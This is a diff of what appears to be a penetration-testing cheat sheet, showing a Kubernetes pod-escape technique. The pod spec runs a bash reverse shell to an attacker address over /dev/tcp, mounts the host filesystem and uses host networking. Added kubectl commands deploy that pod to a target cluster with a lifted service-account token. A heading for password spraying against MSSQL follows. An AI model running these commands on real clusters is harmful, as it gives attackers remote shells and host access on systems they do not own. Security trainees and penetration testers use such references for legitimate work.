@@ -732,8 +732,8 @@ spec:
   containers:
   - name: my-pod
     image: nginx:1.14.2
-    command: ["sh"]
-    args: ["-c", "sh -i >& /dev/tcp/$MYIP/5555 0>&1"]
+    command: ["/bin/bash"]
+    args: ["-c", "/bin/bash -i >& /dev/tcp/$MYIP/5555 0>&1"]
     volumeMounts:
     - mountPath: /mnt
       name: hostfs
@@ -744,6 +744,9 @@ spec:
   automountServiceAccountToken: true
   hostNetwork: true
 
++---------- Kubernetes Create Custom Pod ----------+
+kubectl -s https://$TARGET:8443 --certificate-authority=ca.crt --token=$(cat token) apply -f my.yaml
+kubectl -s https://$TARGET:8443 --certificate-authority=ca.crt --token=$(cat token) get pod
 
 [*] (1433) MSSQL
 +---------- Spray Service ----------+
